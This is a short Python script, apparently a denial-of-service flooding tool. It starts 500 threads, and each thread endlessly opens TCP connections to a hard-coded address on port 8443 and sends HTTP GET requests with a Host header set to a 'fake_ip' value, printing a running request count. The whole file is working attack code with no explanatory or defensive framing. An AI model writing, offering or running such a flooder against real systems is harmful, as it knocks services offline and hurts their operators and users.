import threading
import socket

target = '172.16.0.2'
port = 8443
fake_ip = '185.67.90.32'

number = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        global number
        number += 1
        print(number)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()